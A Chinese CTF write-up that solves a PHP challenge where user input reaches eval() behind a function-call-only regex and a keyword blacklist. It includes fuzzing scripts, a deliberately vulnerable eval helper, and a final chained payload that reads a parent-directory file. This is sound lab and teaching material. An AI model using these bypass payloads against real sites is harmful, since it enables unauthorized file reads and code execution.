这是一道代码审计的题目，感觉挺有意思的，题目如下：

    
    
    <?php
    highlight_file(__FILE__);
    $code = $_GET['code'];
    if (!empty($code)) {
            if (';' === preg_replace('/[a-z]+\((?R)?\)/', NULL, $code)) {
                if (preg_match('/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) {
                        echo 'bye~';
                    } else {
                        eval($code);
                    }
                }
            else {
                echo "No way!!!";
            }
    }else {
            echo "No way!!!";
        }
    

可以发现第11行代码存在`eval`代码执行。而要代码执行读取flag的难点在于解析1个正则和绕过过滤关键函数的地方。首先来分析下if语句的正则。

    
    
    if (';' === preg_replace('/[a-z]+\((?R)?\)/', NULL, $code))
    

使用正则表达式分析网站 [https://regex101.com/`](https://regex101.com/%60)
，发现`xxx()`格式可以通过，所以结合if语句构造`xxx();`的格式就可以通过if的判断，而像类似`xx_xx()`这种带下划线的函数就无法使用。

![](http://qiniu.re13orn.cn/markdown-img-paste-20191104100145597.png)

然后分析过滤关键函数，可以发现过滤函数挺多的，所以要做好本题还就需要去了解PHP更多其他的一些函数。

    
    
     if (preg_match('/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code))
    

为了快速知道目前还有哪些函数可以使用，可以使用下面脚本快速Fuzz出来。

    
    
    <?php
    $allPHPfunNum = count(get_defined_functions()[internal]);
    echo "当前版本PHP的所有内置php函数数量为".$allPHPfunNum."<br>";
    $a = array();
    $b = 0;
    
    for($i=0; $i < $allPHPfunNum; $i++){
    
        $Fun = get_defined_functions()[internal][$i];
    
        if(!preg_match('/_|readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $Fun)){
            $a[$b]=$Fun;
            $b++;
        }
    }
    echo "满足过滤条件的函数数量为".count($a)."<br>";
    print_r($a);
    ?>
    

![](http://qiniu.re13orn.cn/markdown-img-paste-20191118165837515.png)

经过Fuzz发现还有216个函数可以使用，根据题目我们大概知道flag在本目录下的上一个目录的index.php文件

    
    
    index.php   ->flag存放的位置
      code/index.php  ->当前代码文件的位置
    

如何读取文件呢？在php里面读取文件的函数有如下:

    
    
    file()      //把文件读入一个数组中。
    fopen()    //打开一个文件或 URL。
    fread()    //    读取打开的文件。
    fgets()   //从打开的文件中返回一行。
    fgetss()   //从打开的文件中读取一行并过滤掉 HTML 和 PHP 标记。
    fgetc()  //从打开的文件中返回字符。
    dirname() //返回路径中的目录名称部分。
    readfile() //读取一个文件，并输出到输出缓冲。
    

经过筛选和比较这里可以使用`file`这个函数用来读取flag文件。但是由于返回的是一个数组，读取数组我想到了`var_dump`和`print_r`函数，但是都不满足`xx()`这个形式。通过查找，发现PHP的`implode()`函数可以将数组转成字符串。于是到目前可以构造下面这样读取flag的语句：

    
    
    echo(implode(file(chdir(flag文件))));
    

因为flag在本目录的上一级目录下的index.php文件，那么如何表示`../index.php`并且读取呢？我们先思考如何读取本目录的文件。

在php里面关于文件目录操作的函数有如下:

    
    
    chdir()    //改变当前的目录。
    chroot()    //改变根目录。
    closedir()    //关闭目录句柄。
    dir()    //返回 Directory 类的实例。
    getcwd()    //返回当前工作目录。
    opendir()    //打开目录句柄。
    readdir()    //返回目录句柄中的条目。
    rewinddir()    //重置目录句柄。
    scandir()    //返回指定目录中的文件和目录的数组。
    

我们选择函数`scandir()`，这个函数可以把某个目录的所有文件读取出来，并且返回一个数组。

如何表示当前目录呢？我们知道当前目录是一个`.`，那如何获得这样一个目录呢？我们可以看看什么函数会产生`.`。

`.`的ASCII码为46，所以我们可以通过`chr(46)`来表示当前目录。这里就是要考虑如何获得数字46了。

前面已经筛选出了200多个的函数，那么现在先要选出哪些不需要参数即可返回值的参数以及哪些只需要传入一个参数的函数。可以写个小脚本简单fuzz一下。

fuzz python脚本如下：

    
    
    # coding:utf-8
    # author:Reborn
    
    list = ['strcmp','strncmp','strcasecmp','strncasecmp','each','define','defined','date','idate','gmdate','checkdate','readgzfile','gzrewind','gzclose','gzeof','gzread','gzopen','gzpassthru','gzseek','gztell','gzwrite','gzputs','gzfile','gzcompress','gzuncompress','gzdeflate','gzinflate','gzencode','hash','mhash','sleep','usleep','flush','wordwrap','htmlspecialchars','sha1','md5','crc32','iptcparse','iptcembed','phpversion','phpcredits','strspn','strcspn','strtok','strtoupper','strtolower','strpos','stripos','strrpos','strripos','strrev','hebrev','hebrevc','nl2br','stripslashes','stripcslashes','strstr','stristr','strrchr','strpbrk','strcoll','substr','ucfirst','lcfirst','ucwords','strtr','addslashes','addcslashes','rtrim','trim','ltrim','implode','join','soundex','levenshtein','chr','ord','chop','strchr','sscanf','fscanf','urlencode','rawurlencode','readlink','symlink','link','unlink','exec','system','escapeshellcmd','escapeshellarg','passthru','abs','ceil','floor','round','sin','cos','tan','asin','acos','atan','atanh','atan2','sinh','cosh','tanh','asinh','acosh','pow','hypot','deg2rad','rad2deg','fmod','ip2long','long2ip','putenv','uniqid','serialize','unserialize','header','checkdnsrr','floatval','doubleval','strval','boolval','pclose','popen','rewind','rmdir','umask','fclose','feof','fread','fopen','fpassthru','ftruncate','fstat','fseek','ftell','fflush','fwrite','fputs','mkdir','copy','tmpfile','file','fputcsv','flock','fnmatch','fsockopen','pfsockopen','pack','unpack','crypt','opendir','closedir','chdir','rewinddir','readdir','dir','scandir','glob','filegroup','fileinode','fileowner','fileperms','filesize','stat','lstat','chown','chgrp','lchown','lchgrp','chmod','touch','clearstatcache','diskfreespace','mail','ksort','krsort','asort','arsort','sort','rsort','usort','uasort','uksort','shuffle','end','prev','next','key','min','max','extract','compact','range','pos','sizeof','assert','ftok','virtual','jdtogregorian','jdtojulian','jdtojewish','jewishtojd','jdtofrench','frenchtojd','jddayofweek','unixtojd','jdtounix','textdomain','iconv','readline']
    
    import requests
    sts = "echo %s();"
    url = "http://127.0.0.1/tmp.php?s=%s"
    for i in list:
        stt = sts%(i)
        u = url%(stt)
        req = requests.get(url=u)
        resp = req.text
        if "Warning" in str(resp):
            pass
        elif "error" in str(resp):
            pass
        else:
            print(u, '\t', req.text)
    

筛选出只需要一个参数的python 脚本：

    
    
    list = [...]
    
    import requests
    sts = "echo %s();"
    url = "http://127.0.0.1/tmp.php?s=%s"
    for i in list:
        stt = sts%(i)
        u = url%(stt)
        req = requests.get(url=u)
        resp = str(req.text)
        if r"expects at least 1 parameter" in resp:
            print(i)
    

这些python脚本还需要配合一个PHP脚本才能生效：

    
    
    error_reporting(0);
    <?php
    $s = $_GET['s'];
    eval($s);
    ?>
    

得到如下无需传参即可返回值的函数：

    
    
    phpversion()  //返回当前的PHP版本，这个不同版本环境返回的值也不同
    phpcredits()  //打印PHP贡献者名单
    uniqid()      //基于以微秒计的当前时间，生成一个唯一的 ID，这个函数每一秒返回的值都不同
    tmpfile()  //以读写（w+）模式建立一个具有唯一文件名的临时文件
    unixtojd() //把 Unix 时间戳转换为儒略日计数
    

得到如下只需要传入一个参数即可返回值的函数：

    
    
    ['strcmp','strncmp','strcasecmp','strncasecmp','each','define','defined','date','idate','gmdate','checkdate','readgzfile','gzrewind','gzclose','gzeof','gzread','gzopen','gzpassthru','gzseek','gztell','gzwrite','gzputs','gzfile','gzcompress','gzuncompress','gzdeflate','gzinflate',...]
    

![](http://qiniu.re13orn.cn/markdown-img-paste-20191120150153339.png)

可以发现，比较稳定的可以用来作为别的函数参数两个函数就是`phpversion()`和`unixtojd()`了。

跑的过程中也出现过46，但是是通过`round`函数跑出随机数，不够稳定。![](http://qiniu.re13orn.cn/markdown-img-paste-20191120173047279.png)

而且在fuzz的过程当中，发现有大量函数是不可用的，需要一一排除，而比较好用的是那些用于数学计算的函数。我这里fuzz了好久也没有得到一个稳定的46出来，于是我就开始想直接获得`.`的办法。

通过搜索，找到一种利用hash特性方法构造了一个语句`chr(ord(hebrevc(crypt(phpversion()))))`，`hebrevc(crypt(1))`进行加密的时候，大概率首个符号为`$`，小概率首个符号为`.`，所以通过`ord`取出第一个字母的ascii在转成字符，就有一定概率获得`.`这个符号，经过我的测试，获得`.`的次数比重还是比较大的，所以就直接采用这个方法了。

![](http://qiniu.re13orn.cn/markdown-img-paste-20191121140952326.png)

![](http://qiniu.re13orn.cn/markdown-img-paste-2019112114100970.png)

接下来通过`scandir`函数我们可以得到一个数组，数组的第二个元素是`..`，也就是上一级目录。

![](http://qiniu.re13orn.cn/markdown-img-paste-20191121113929518.png)

在PHP中有一组函数是关于操作数组内部指针指向的函数，如下：

    
    
    current() - 返回数组中的当前元素的值
    pos() - 函数返回数组中的当前元素的值。
    next() - 将内部指针指向数组中的下一个元素，并输出
    prev() - 将内部指针指向数组中的上一个元素，并输出
    reset() - 将内部指针指向数组中的第一个元素，并输出
    each() - 返回当前元素的键名和键值，并将内部指针向前移动
    

通过`next`函数即可得到`..`：

![](http://qiniu.re13orn.cn/markdown-img-paste-20191121114241840.png)

然后接下来的思路就是，用`chdir`函数将当前路径改变为上一路径。

![](http://qiniu.re13orn.cn/markdown-img-paste-20191121115147907.png)

通过`chdir`成功将当前路径改为上一个路径了，只需要再次构造一个`.`即可。

`chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))`部分则是改变当前路径为上一级并且返回一个`.`。，`echo(implode(file(end(scandir()))))`部分为读取文件内容并输出。综上所述最终获得WP
为：`echo(implode(file(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))))));`。

由于2个点都是有一些概率，需要多试几次才能保证同时出现，所以简单的重放就可以获得flag了：

![](http://qiniu.re13orn.cn/markdown-img-paste-20191121141525133.png)

  

